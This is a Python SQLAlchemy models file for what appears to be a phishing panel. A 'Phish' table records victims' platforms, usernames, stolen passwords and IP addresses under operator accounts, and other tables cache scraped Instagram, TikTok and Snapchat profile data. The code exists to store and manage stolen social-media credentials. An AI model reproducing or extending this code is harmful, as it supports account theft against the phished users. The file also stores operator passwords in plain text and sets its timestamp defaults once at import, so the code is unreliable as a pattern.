from app import db
from sqlalchemy.orm import relationship
from sqlalchemy import ForeignKey, DateTime
from datetime import datetime
class User(db.Model):
    __tablename__ = "users"
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String, nullable=False)
    password = db.Column(db.String, nullable=False)
    is_superuser = db.Column(db.Boolean, nullable=False, default=False)
    accounts = relationship("Phish")

class Phish(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    owner = db.Column(db.String, ForeignKey('users.username'))
    platform = db.Column(db.String)
    phised_user = db.Column(db.String)
    phished_pword = db.Column(db.String)
    ip = db.Column(db.String)

class Insta_info(db.Model):
    __tablename__ = 'ig_info'
    id = db.Column(db.Integer, primary_key=True)
    followers = db.Column(db.String)
    following = db.Column(db.String)
    posts = db.Column(db.String)
    pfp_url = db.Column(db.String)
    username = db.Column(db.String)
    bio = db.Column(db.String)
    searched_last = db.Column(DateTime, default=datetime.utcnow())


class Tiktok_info(db.Model):
    __tablename__ = 'tt_info'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String)
    nickname = db.Column(db.String)
    diggCount = db.Column(db.String)
    followerCount = db.Column(db.String)
    followingCount = db.Column(db.String)
    heart = db.Column(db.String)
    videoCount = db.Column(db.String)
    heartCount = db.Column(db.String)
    desc = db.Column(db.String)
    pfp_url = db.Column(db.String)
    searched_last = db.Column(DateTime, default=datetime.utcnow())

'''        insta_to_insert = Insta_info(followers=followers,
                                     posts=posts,
                                     engagement='',
                                     pfp_url=pfp_url,
                                     username=username,
                                     bio=bio,
                                     following=following)
'''
class Snapchat_info(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String)
    exists = db.Column(db.String)
    searched_last = db.Column(DateTime, default=datetime.utcnow())
    
# class Site_User(db.Model):
#     __tablename__ = "site_user"
#     id = db.Column(db.Integer, primary_key=True)
#     username = db.Column(db.String, unique=True)
#     password = db.Column(db.String)
#     accounts = relationship("Phish")
    
